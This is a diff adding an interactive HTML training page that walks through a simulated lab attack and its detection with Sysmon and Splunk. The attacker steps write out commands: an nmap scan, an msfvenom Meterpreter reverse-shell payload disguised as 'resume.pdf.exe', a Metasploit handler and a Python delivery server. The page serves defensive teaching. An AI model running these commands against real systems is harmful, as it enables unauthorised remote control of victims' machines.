@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interactive Report: End-to-End Attack Simulation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #F8F7F4;
+            color: #2c3e50;
+        }
+        .nav-link {
+            transition: all 0.3s ease;
+        }
+        .nav-link.active {
+            color: #3498db;
+            border-bottom: 2px solid #3498db;
+        }
+        .terminal-window {
+            background-color: #1e1e1e;
+            color: #d4d4d4;
+            font-family: 'Courier New', Courier, monospace;
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        .terminal-prompt {
+            color: #569cd6;
+        }
+        .terminal-command {
+            color: #dcdcaa;
+        }
+        .terminal-output {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .chart-container {
+            position: relative;
+            margin: auto;
+            height: 350px;
+            width: 100%;
+            max-width: 700px;
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0,0,0,0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 50;
+        }
+        .modal-content {
+            background-color: #ffffff;
+            padding: 2rem;
+            border-radius: 0.5rem;
+            max-width: 90%;
+            width: 600px;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        [data-section] {
+            display: none;
+        }
+        [data-section].active {
+            display: block;
+        }
+        .tool-bubble {
+            position: relative;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            perspective: 1000px;
+        }
+        .tool-bubble:hover {
+            transform: translateY(-8px) scale(1.05);
+        }
+        .tool-circle {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #f6f8fa 0%, #e9ecef 100%);
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            border: 2px solid #e2e8f0;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .tool-circle::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transform: translateX(-100%);
+            transition: transform 0.6s ease;
+        }
+        .tool-circle:hover::before {
+            transform: translateX(100%);
+        }
+        .tool-circle:active {
+            transform: scale(0.95);
+        }
+        .tool-circle.active {
+            border-color: #3498db;
+            box-shadow: 0 0 0 4px rgba(52, 152, 219, 0.2);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(52, 152, 219, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(52, 152, 219, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(52, 152, 219, 0); }
+        }
+        .tool-icon {
+            font-size: 2.5rem;
+            transition: transform 0.3s ease;
+        }
+        .tool-circle:hover .tool-icon {
+            transform: scale(1.1) rotate(5deg);
+        }
+        .tool-bubble-content {
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%) translateY(10px);
+            background: white;
+            padding: 1.2rem;
+            border-radius: 0.75rem;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1);
+            width: 280px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 10;
+            margin-top: 1rem;
+            transform-origin: top center;
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .tool-bubble:hover .tool-bubble-content {
+            opacity: 1;
+            visibility: visible;
+            transform: translateX(-50%) translateY(0);
+        }
+        .tool-bubble-content::before {
+            content: '';
+            position: absolute;
+            top: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-left: 8px solid transparent;
+            border-right: 8px solid transparent;
+            border-bottom: 8px solid white;
+            filter: drop-shadow(0 -2px 2px rgba(0, 0, 0, 0.05));
+        }
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 2.5rem;
+            justify-items: center;
+            padding: 2rem;
+            perspective: 1000px;
+        }
+        .tool-bubble-content a {
+            position: relative;
+            overflow: hidden;
+        }
+        .tool-bubble-content a::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transform: translateX(-100%);
+            transition: transform 0.6s ease;
+        }
+        .tool-bubble-content a:hover::after {
+            transform: translateX(100%);
+        }
+        .tool-role-badge {
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .tool-description {
+            position: relative;
+            overflow: hidden;
+            max-height: 3em;
+            transition: max-height 0.3s ease;
+        }
+        .tool-bubble:hover .tool-description {
+            max-height: 6em;
+        }
+        /* Add new styles for deep dive bubbles */
+        .deep-dive-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            padding: 2rem;
+        }
+        .deep-dive-bubble {
+            background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
+            border-radius: 1.5rem;
+            padding: 2rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(226, 232, 240, 0.8);
+            position: relative;
+            overflow: hidden;
+        }
+        .deep-dive-bubble:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .deep-dive-bubble::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #3498db, #2ecc71);
+        }
+        .tool-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+        .tool-icon-large {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #f6f8fa 0%, #e9ecef 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin-right: 1rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+        .use-case-list {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+        }
+        .use-case-list li {
+            margin-bottom: 0.75rem;
+            position: relative;
+            padding-left: 1.5rem;
+        }
+        .use-case-list li::before {
+            content: '•';
+            color: #3498db;
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+        }
+        .condition-tag {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            background: #e3f2fd;
+            color: #1976d2;
+            border-radius: 1rem;
+            font-size: 0.875rem;
+            margin: 0.25rem;
+        }
+        .docs-button {
+            display: inline-flex;
+            align-items: center;
+            padding: 0.75rem 1.5rem;
+            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+            color: white;
+            border-radius: 0.75rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-top: 1rem;
+            width: 100%;
+            justify-content: center;
+        }
+        .docs-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(52, 152, 219, 0.3);
+        }
+        .docs-button svg {
+            margin-right: 0.5rem;
+        }
+    </style>
+</head>
+<body class="antialiased">
+    <div id="app-container" class="min-h-screen">
+        <header class="bg-white shadow-sm sticky top-0 z-40">
+            <nav class="container mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex items-center justify-between h-16">
+                    <div class="flex-shrink-0">
+                        <h1 class="text-xl font-bold text-gray-800">Cyber Attack Simulation</h1>
+                    </div>
+                    <div class="hidden md:block">
+                        <div class="ml-10 flex items-baseline space-x-4">
+                            <a href="#overview" data-nav="overview" class="nav-link px-3 py-2 rounded-md text-sm font-medium text-gray-700 hover:text-[#3498db] hover:bg-gray-100">Overview</a>
+                            <a href="#playbook" data-nav="playbook" class="nav-link px-3 py-2 rounded-md text-sm font-medium text-gray-700 hover:text-[#3498db] hover:bg-gray-100">The Playbook</a>
+                            <a href="#tools" data-nav="tools" class="nav-link px-3 py-2 rounded-md text-sm font-medium text-gray-700 hover:text-[#3498db] hover:bg-gray-100">Tool Deep Dive</a>
+                            <a href="#dashboard" data-nav="dashboard" class="nav-link px-3 py-2 rounded-md text-sm font-medium text-gray-700 hover:text-[#3498db] hover:bg-gray-100">Detection Dashboard</a>
+                        </div>
+                    </div>
+                </div>
+            </nav>
+        </header>
+
+        <main class="container mx-auto px-4 sm:px-6 lg:px-8 py-8">
+            <section id="overview-section" data-section="overview">
+                <div class="text-center mb-12">
+                    <h2 class="text-3xl font-bold tracking-tight text-gray-900 sm:text-4xl">End-to-End Attack & Detection</h2>
+                    <p class="mt-4 text-lg leading-8 text-gray-600">An interactive walkthrough of a simulated cyber attack, from initial reconnaissance to post-exploitation, and how to detect it using modern security tools.</p>
+                </div>
+
+                <div class="bg-white p-8 rounded-lg shadow-md mb-12">
+                    <h3 class="text-2xl font-semibold mb-4 text-center">The Scenario</h3>
+                    <p class="text-gray-700 leading-relaxed">This simulation follows a common attack pattern where an attacker gains access to a victim's machine. We will explore the tools and techniques used by both the attacker (Red Team) and the security analyst (Blue Team) to understand the full lifecycle of an incident. The goal is to see not just how an attack happens, but how robust monitoring can reveal every step.</p>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
+                    <div class="bg-white p-6 rounded-lg shadow text-center">
+                        <div class="text-4xl mb-3">👨‍💻</div>
+                        <h4 class="text-xl font-semibold mb-2">The Attacker</h4>
+                        <p class="text-gray-600">Uses Kali Linux to scan the target, create malware, and establish a remote shell.</p>
+                    </div>
+                    <div class="bg-white p-6 rounded-lg shadow text-center">
+                        <div class="text-4xl mb-3">🖥️</div>
+                        <h4 class="text-xl font-semibold mb-2">The Victim</h4>
+                        <p class="text-gray-600">A Windows machine instrumented with Sysmon for deep system monitoring.</p>
+                    </div>
+                    <div class="bg-white p-6 rounded-lg shadow text-center">
+                        <div class="text-4xl mb-3">🕵️‍♀️</div>
+                        <h4 class="text-xl font-semibold mb-2">The Analyst</h4>
+                        <p class="text-gray-600">Uses Splunk to ingest and analyze Sysmon logs to detect the attack.</p>
+                    </div>
+                </div>
+                
+                <div class="bg-white p-8 rounded-lg shadow-md">
+                    <h3 class="text-2xl font-semibold mb-6 text-center">Core Toolchain</h3>
+                    <div id="toolchain-grid" class="tool-grid">
+                    </div>
+                </div>
+            </section>
+
+            <section id="playbook-section" data-section="playbook">
+                <div class="text-center mb-12">
+                    <h2 class="text-3xl font-bold tracking-tight text-gray-900 sm:text-4xl">The Attack & Defense Playbook</h2>
+                    <p class="mt-4 text-lg leading-8 text-gray-600">Follow the step-by-step sequence of events. Use the buttons to navigate through the timeline.</p>
+                </div>
+                <div id="playbook-content" class="bg-white p-6 sm:p-8 rounded-lg shadow-lg">
+                    </div>
+                 <div class="mt-6 flex justify-between">
+                    <button id="prev-step" class="bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 px-4 rounded-lg transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed">Previous Step</button>
+                    <div id="step-counter" class="text-gray-600 self-center"></div>
+                    <button id="next-step" class="bg-[#3498db] hover:bg-[#2980b9] text-white font-bold py-2 px-4 rounded-lg transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed">Next Step</button>
+                </div>
+            </section>
+
+            <section id="tools-section" data-section="tools">
+                <div class="text-center mb-12">
+                    <h2 class="text-3xl font-bold tracking-tight text-gray-900 sm:text-4xl">Tool Deep Dive</h2>
+                    <p class="mt-4 text-lg leading-8 text-gray-600">Explore each tool's capabilities, use cases, and documentation.</p>
+                </div>
+                <div id="tool-cards" class="deep-dive-grid">
+                </div>
+            </section>
+            
+            <section id="dashboard-section" data-section="dashboard">
+                <div class="text-center mb-12">
+                    <h2 class="text-3xl font-bold tracking-tight text-gray-900 sm:text-4xl">Detection Dashboard</h2>
+                    <p class="mt-4 text-lg leading-8 text-gray-600">Analyze the telemetry generated by the attack. This dashboard simulates what a security analyst would see in a SIEM like Splunk.</p>
+                </div>
+
+                <div class="bg-white p-6 sm:p-8 rounded-lg shadow-lg mb-8">
+                     <h3 class="text-xl font-semibold mb-4 text-center text-gray-800">Key Sysmon Events Generated</h3>
+                     <p class="text-center text-gray-600 mb-6">This chart shows the volume of key events captured by Sysmon during the attack. Click on a bar to filter the log viewer below.</p>
+                    <div class="chart-container">
+                        <canvas id="sysmonEventsChart"></canvas>
+                    </div>
+                </div>
+                
+                <div class="bg-white p-6 sm:p-8 rounded-lg shadow-lg">
+                    <h3 id="log-viewer-title" class="text-xl font-semibold mb-4 text-gray-800">Simulated Log Viewer</h3>
+                    <div id="log-viewer-content" class="bg-gray-100 p-4 rounded-md max-h-96 overflow-y-auto">
+                        <p class="text-gray-500">Select an event type from the chart above to see the corresponding logs.</p>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <div id="tool-modal" class="modal-overlay hidden">
+        <div id="modal-content" class="modal-content">
+            </div>
+    </div>
+
+    <script>
+        const appData = {
+            tools: [
+                { 
+                    id: 'nmap', 
+                    name: 'Nmap', 
+                    icon: '📡', 
+                    description: 'Used for network discovery and security auditing. In this scenario, it scans the victim machine to find open ports and running services.', 
+                    role: 'Reconnaissance',
+                    docs: 'https://nmap.org/docs.html'
+                },
+                { 
+                    id: 'msfvenom', 
+                    name: 'MSFvenom', 
+                    icon: '🦠', 
+                    description: 'A payload generator that is part of the Metasploit Framework. It was used to create the malicious "resume.pdf.exe" file.', 
+                    role: 'Weaponization',
+                    docs: 'https://docs.rapid7.com/metasploit/msfvenom/'
+                },
+                { 
+                    id: 'pythonhttp', 
+                    name: 'Python HTTP Server', 
+                    icon: '🌐', 
+                    description: 'A simple command-line HTTP server used to host the malicious payload, making it available for the victim to download.', 
+                    role: 'Delivery',
+                    docs: 'https://docs.python.org/3/library/http.server.html'
+                },
+                { 
+                    id: 'metasploit', 
+                    name: 'Metasploit', 
+                    icon: '🕹️', 
+                    description: 'A penetration testing platform. Its "multi/handler" module was used to listen for and receive the connection from the executed payload.', 
+                    role: 'Command & Control',
+                    docs: 'https://docs.rapid7.com/metasploit/'
+                },
+                { 
+                    id: 'sysmon', 
+                    name: 'Sysmon', 
+                    icon: '👁️', 
+                    description: 'An advanced Windows monitoring tool that provides deep visibility into process creations, network connections, and other system activities.', 
+                    role: 'Detection',
+                    docs: 'https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon'
+                },
+                { 
+                    id: 'splunk', 
+                    name: 'Splunk', 
+                    icon: '📊', 
+                    description: 'A SIEM platform used to ingest, search, and analyze the logs generated by Sysmon, enabling the detection of the attack.', 
+                    role: 'Analysis',
+                    docs: 'https://docs.splunk.com/Documentation/Splunk'
+                },
+                { 
+                    id: 'netstat', 
+                    name: 'Netstat', 
+                    icon: '🔌', 
+                    description: 'A command-line tool used on the victim machine to display active network connections and confirm the malware\'s C2 connection.', 
+                    role: 'Verification',
+                    docs: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netstat'
+                },
+            ],
+            playbook: [
+                { 
+                    title: 'Step 1: Reconnaissance (Attacker)',
+                    actor: 'Attacker (Kali Linux)',
+                    description: 'The attacker starts by scanning the victim machine (IP: 192.168.1.167) with Nmap to discover open ports and services. The `-A` flag enables aggressive scanning (OS detection, version scanning, etc.) and `-Pn` skips the ping test.',
+                    command: 'nmap -A -Pn 192.168.1.167',
+                    output: `Starting Nmap...\nNmap scan report for 192.168.1.167\nHost is up.\nNot shown: 998 closed ports\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n... (RDP port found open)`
+                },
+                { 
+                    title: 'Step 2: Weaponization (Attacker)',
+                    actor: 'Attacker (Kali Linux)',
+                    description: 'Using the victim\'s information, the attacker generates a malicious payload using MSFvenom. This payload is a reverse TCP shell that will connect back to the attacker\'s machine (IP: 192.168.1.181 on port 4444). The output is disguised as a PDF file.',
+                    command: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.181 LPORT=4444 -f exe -o resume.pdf.exe`,
+                    output: `Payload size: 510 bytes\nSaved as: resume.pdf.exe`
+                },
+                {
+                    title: 'Step 3: Setting up the Listener (Attacker)',
+                    actor: 'Attacker (Kali Linux)',
+                    description: 'The attacker configures Metasploit to listen for the incoming connection from the payload. The handler is configured with the same payload, LHOST, and LPORT settings.',
+                    command: `use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.181\nset LPORT 4444\nexploit -j`,
+                    output: `[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.1.181:4444`
+                },
+                {
+                    title: 'Step 4: Delivery (Attacker)',
+                    actor: 'Attacker (Kali Linux)',
+                    description: 'The attacker starts a simple Python web server to host the \`resume.pdf.exe\` file, making it accessible for download by the victim.',
+                    command: `python3 -m http.server 9999`,
+                    output: `Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...`
+                },
+                {
+                    title: 'Step 5: Execution (Victim)',
+                    actor: 'Victim (Windows)',
+                    description: 'The user on the victim machine is lured into downloading and running the \`resume.pdf.exe\` file from the attacker\'s web server. Windows Defender has been disabled for this lab.',
+                    command: `(User opens browser, navigates to http://192.168.1.181:9999, downloads and double-clicks resume.pdf.exe)`,
+                    output: `(The file runs, but nothing visible happens to the user)`
+                },
+                {
+                    title: 'Step 6: Command & Control (Attacker)',
+                    actor: 'Attacker (Kali Linux)',
+                    description: 'Back on the attacker\'s machine, the Metasploit handler receives the connection from the victim, opening a Meterpreter session which gives the attacker remote control.',
+                    command: `(Watching the msfconsole window)`,
+                    output: `[*] Sending stage (206403 bytes) to 192.168.1.167\n[*] Meterpreter session 1 opened (192.168.1.181:4444 -> 192.168.1.167:49152)`
+                },
+                {
+                    title: 'Step 7: Local Verification (Victim/Analyst)',
+                    actor: 'Analyst (on Victim Machine)',
+                    description: 'An analyst can locally verify the suspicious connection using \`netstat\`. The output shows an established connection from the victim to the attacker\'s C2 server on port 4444, initiated by the process with PID 10208.',
+                    command: `netstat -anob`,
+                    output: `Proto  Local Address          Foreign Address        State           PID\nTCP    192.168.1.167:49152    192.168.1.181:4444     ESTABLISHED     10208\n[resume.pdf.exe]`
+                },
+                {
+                    title: 'Step 8: Detection & Analysis (Analyst)',
+                    actor: 'Analyst (Splunk)',
+                    description: 'The analyst turns to Splunk, where Sysmon logs are being ingested. By searching for the execution of the payload, they can find detailed information about the process creation (Event ID 1).',
+                    command: `index=endpoint sourcetype="sysmon" EventCode=1 "resume.pdf.exe"`,
+                    output: `(Splunk event shows ParentImage: explorer.exe, Image: C:\\Users\\...\\resume.pdf.exe, ProcessID: 10208)`
+                },
+                {
+                    title: 'Step 9: Correlating Events (Analyst)',
+                    actor: 'Analyst (Splunk)',
+                    description: 'The analyst pivots to find network connections (Event ID 3) made by the malicious process (PID 10208), confirming the C2 communication seen with netstat.',
+                    command: `index=endpoint sourcetype="sysmon" EventCode=3 ProcessId=10208`,
+                    output: `(Splunk event shows Image: C:\\...\\resume.pdf.exe, DestinationIp: 192.168.1.181, DestinationPort: 4444)`
+                }
+            ],
+            sysmonData: {
+                labels: ['Process Create (1)', 'Network Conn. (3)', 'Process Terminated (5)', 'File Create (11)'],
+                counts: [4, 2, 2, 6],
+                logs: [
+                    { eventCode: 1, timestamp: '2025-06-01T21:05:10Z', details: `Process Create:\n  ProcessID: 10208\n  Image: C:\\Users\\Victim\\Downloads\\resume.pdf.exe\n  CommandLine: "C:\\Users\\Victim\\Downloads\\resume.pdf.exe"\n  ParentImage: C:\\Windows\\explorer.exe\n  ParentProcessID: 4056` },
+                    { eventCode: 1, timestamp: '2025-06-01T21:05:30Z', details: `Process Create:\n  ProcessID: 8308\n  Image: C:\\Windows\\System32\\cmd.exe\n  CommandLine: cmd.exe\n  ParentImage: C:\\Users\\Victim\\Downloads\\resume.pdf.exe\n  ParentProcessID: 10208` },
+                    { eventCode: 1, timestamp: '2025-06-01T21:05:31Z', details: `Process Create:\n  ProcessID: 8312\n  Image: C:\\Windows\\System32\\net1.exe\n  CommandLine: net user\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  ParentProcessID: 8308` },
+                     { eventCode: 1, timestamp: '2025-06-01T21:05:32Z', details: `Process Create:\n  ProcessID: 8316\n  Image: C:\\Windows\\System32\\ipconfig.exe\n  CommandLine: ipconfig\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  ParentProcessID: 8308` },
+                    { eventCode: 3, timestamp: '2025-06-01T21:05:11Z', details: `Network Connection:\n  ProcessID: 10208\n  Image: C:\\Users\\Victim\\Downloads\\resume.pdf.exe\n  Protocol: tcp\n  SourceIp: 192.168.1.167\n  DestinationIp: 192.168.1.181\n  DestinationPort: 4444` },
+                    { eventCode: 3, timestamp: '2025-06-01T21:05:12Z', details: `Network Connection:\n  ProcessID: 10208\n  Image: C:\\Users\\Victim\\Downloads\\resume.pdf.exe\n  Protocol: tcp\n  SourceIp: 192.168.1.167\n  DestinationIp: 192.168.1.181\n  DestinationPort: 4444 (Stage download)` },
+                    { eventCode: 5, timestamp: '2025-06-01T21:10:00Z', details: `Process Terminated:\n  ProcessID: 10208\n  Image: C:\\Users\\Victim\\Downloads\\resume.pdf.exe` },
+                    { eventCode: 5, timestamp: '2025-06-01T21:10:00Z', details: `Process Terminated:\n  ProcessID: 8308\n  Image: C:\\Windows\\System32\\cmd.exe` },
+                    { eventCode: 11, timestamp: '2025-06-01T21:05:05Z', details: `File Create:\n  ProcessID: 5012\n  Image: C:\\Program Files\\...\\chrome.exe\n  TargetFilename: C:\\Users\\Victim\\Downloads\\resume.pdf.exe` },
+                ]
+            }
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const sections = document.querySelectorAll('[data-section]');
+            const navLinks = document.querySelectorAll('[data-nav]');
+            const playbookContent = document.getElementById('playbook-content');
+            const prevButton = document.getElementById('prev-step');
+            const nextButton = document.getElementById('next-step');
+            const stepCounter = document.getElementById('step-counter');
+            
+            const toolCardsContainer = document.getElementById('tool-cards');
+            const toolModal = document.getElementById('tool-modal');
+            const modalContent = document.getElementById('modal-content');
+            const toolIconsOverview = document.getElementById('tool-icons-overview');
+
+            let currentStep = 0;
+
+            function navigateTo(sectionId) {
+                sections.forEach(s => s.classList.remove('active'));
+                navLinks.forEach(l => l.classList.remove('active'));
+
+                const activeSection = document.getElementById(`${sectionId}-section`);
+                const activeLink = document.querySelector(`[data-nav="${sectionId}"]`);
+                
+                if (activeSection) activeSection.classList.add('active');
+                if (activeLink) activeLink.classList.add('active');
+            }
+
+            function updatePlaybookStep() {
+                const step = appData.playbook[currentStep];
+                playbookContent.innerHTML = `
+                    <div class="mb-4">
+                        <span class="inline-block bg-blue-100 text-[#3498db] text-sm font-semibold px-3 py-1 rounded-full">${step.actor}</span>
+                    </div>
+                    <h3 class="text-2xl font-bold text-gray-800 mb-3">${step.title}</h3>
+                    <p class="text-gray-700 leading-relaxed mb-6">${step.description}</p>
+                    <div class="terminal-window">
+                        <div class="terminal-output">
+                            ${step.command.split('\n').map(line => `<span class="terminal-prompt">${step.actor === 'Analyst (Splunk)' ? 'SPL> ' : '$ '}</span><span class="terminal-command">${line}</span>`).join('\n')}
+                        </div>
+                        <hr class="border-gray-600 my-4">
+                        <div class="terminal-output text-gray-400">
+                            ${step.output}
+                        </div>
+                    </div>
+                `;
+                stepCounter.textContent = `Step ${currentStep + 1} of ${appData.playbook.length}`;
+                prevButton.disabled = currentStep === 0;
+                nextButton.disabled = currentStep === appData.playbook.length - 1;
+            }
+            
+            function renderTools() {
+                // Clear existing content
+                const toolchainGrid = document.getElementById('toolchain-grid');
+                toolchainGrid.innerHTML = '';
+                toolCardsContainer.innerHTML = '';
+
+                // Update the tools data with use cases and conditions
+                const toolsWithDetails = appData.tools.map(tool => ({
+                    ...tool,
+                    useCases: getToolUseCases(tool.id),
+                    conditions: getToolConditions(tool.id)
+                }));
+
+                // Render tools in the overview section
+                toolsWithDetails.forEach((tool, index) => {
+                    const toolBubble = document.createElement('div');
+                    toolBubble.className = 'tool-bubble';
+                    toolBubble.style.animationDelay = `${index * 0.1}s`;
+                    toolBubble.innerHTML = `
+                        <div class="tool-circle" data-tool-id="${tool.id}">
+                            <div class="tool-icon">${tool.icon}</div>
+                        </div>
+                        <div class="tool-bubble-content">
+                            <div class="flex items-center mb-2">
+                                <h4 class="text-lg font-semibold text-gray-800">${tool.name}</h4>
+                                <span class="ml-2 tool-role-badge inline-block bg-blue-100 text-blue-800 text-xs font-semibold px-2 py-0.5 rounded-full">${tool.role}</span>
+                            </div>
+                            <p class="tool-description text-sm text-gray-600 mb-3">${tool.description}</p>
+                            <a href="${tool.docs}" target="_blank" 
+                               class="inline-flex items-center px-3 py-1.5 bg-blue-600 text-white text-sm rounded-md hover:bg-blue-700 transition-colors w-full justify-center">
+                                <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path>
+                                </svg>
+                                View Documentation
+                            </a>
+                        </div>
+                    `;
+                    toolchainGrid.appendChild(toolBubble);
+
+                    // Add click handler with animation
+                    const toolCircle = toolBubble.querySelector('.tool-circle');
+                    toolCircle.addEventListener('click', () => {
+                        // Remove active class from all circles
+                        document.querySelectorAll('.tool-circle').forEach(circle => {
+                            circle.classList.remove('active');
+                        });
+                        // Add active class to clicked circle
+                        toolCircle.classList.add('active');
+                        // Show modal after a short delay
+                        setTimeout(() => {
+                            showToolModal(tool.id);
+                        }, 300);
+                    });
+
+                    // Add hover sound effect (optional)
+                    toolCircle.addEventListener('mouseenter', () => {
+                        const audio = new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU');
+                        audio.volume = 0.1;
+                        audio.play().catch(() => {}); // Ignore if audio fails to play
+                    });
+                });
+
+                // Render tools in the deep dive section with new bubble design
+                toolsWithDetails.forEach(tool => {
+                    const deepDiveBubble = document.createElement('div');
+                    deepDiveBubble.className = 'deep-dive-bubble';
+                    deepDiveBubble.innerHTML = `
+                        <div class="tool-header">
+                            <div class="tool-icon-large">${tool.icon}</div>
+                            <div>
+                                <h3 class="text-xl font-bold text-gray-800">${tool.name}</h3>
+                                <span class="inline-block bg-blue-100 text-blue-800 text-xs font-semibold px-2 py-0.5 rounded-full mt-1">${tool.role}</span>
+                            </div>
+                        </div>
+                        <p class="text-gray-600 mb-4">${tool.description}</p>
+                        
+                        <h4 class="font-semibold text-gray-800 mb-2">Use Cases:</h4>
+                        <ul class="use-case-list text-gray-600">
+                            ${tool.useCases.map(useCase => `<li>${useCase}</li>`).join('')}
+                        </ul>
+                        
+                        <h4 class="font-semibold text-gray-800 mb-2 mt-4">Best Used When:</h4>
+                        <div class="flex flex-wrap gap-2 mb-4">
+                            ${tool.conditions.map(condition => 
+                                `<span class="condition-tag">${condition}</span>`
+                            ).join('')}
+                        </div>
+                        
+                        <a href="${tool.docs}" target="_blank" class="docs-button">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path>
+                            </svg>
+                            View Documentation
+                        </a>
+                    `;
+                    toolCardsContainer.appendChild(deepDiveBubble);
+                });
+            }
+            
+            function showToolModal(toolId) {
+                const tool = appData.tools.find(t => t.id === toolId);
+                if (!tool) return;
+                
+                modalContent.innerHTML = `
+                    <div class="flex justify-between items-start">
+                        <div class="flex items-center">
+                            <div class="text-4xl mr-4 animate-bounce">${tool.icon}</div>
+                            <h3 class="text-2xl font-bold text-gray-800">${tool.name}</h3>
+                        </div>
+                        <button id="close-modal" class="text-gray-500 hover:text-gray-800 text-2xl transition-colors">&times;</button>
+                    </div>
+                    <span class="inline-block bg-green-100 text-green-800 text-xs font-semibold px-2 py-0.5 rounded-full mb-4 animate-fade-in">${tool.role}</span>
+                    <p class="text-gray-700 mb-4">${tool.description}</p>
+                    <a href="${tool.docs}" target="_blank" 
+                       class="inline-flex items-center px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition-all transform hover:scale-105">
+                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
